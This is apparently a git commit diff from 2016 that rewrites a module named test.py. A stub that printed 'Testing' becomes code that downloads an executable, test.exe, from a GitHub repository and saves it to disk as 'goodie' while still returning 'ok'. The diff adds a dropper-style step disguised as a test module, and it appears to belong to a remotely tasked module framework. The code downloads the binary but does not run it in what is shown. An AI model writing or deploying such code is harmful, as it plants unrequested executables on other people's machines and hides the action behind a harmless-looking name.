f782ff42fc985e970c39b463e623ed9bb3718548
experiment2016 <sarpiericam@libero.it>
2016-05-31 15:17:21 +0200

    Update test.py

--- modules/test.py
+++ modules/test.py
@@ -1,8 +1,22 @@
+import requests
 
 def run(**args):
   try:
-      print("Testing")               
-      ta = "ok"
-      return str(ta)
+   
+     goodie = "test.exe"
+     url = 'https://github.com/experiment2016/workhub/raw/master/test.exe'
+     r = requests.get(url, stream=True)
+
+     with open(goodie, 'wb') as fd:
+         for chunk in r.iter_content(chunk_size=1024):
+             fd.write(chunk)
+     fd.close()
+     te = "ok"
+     return str(te)
+     
   except Exception, e:
       return str(e)
+
+     
+
+
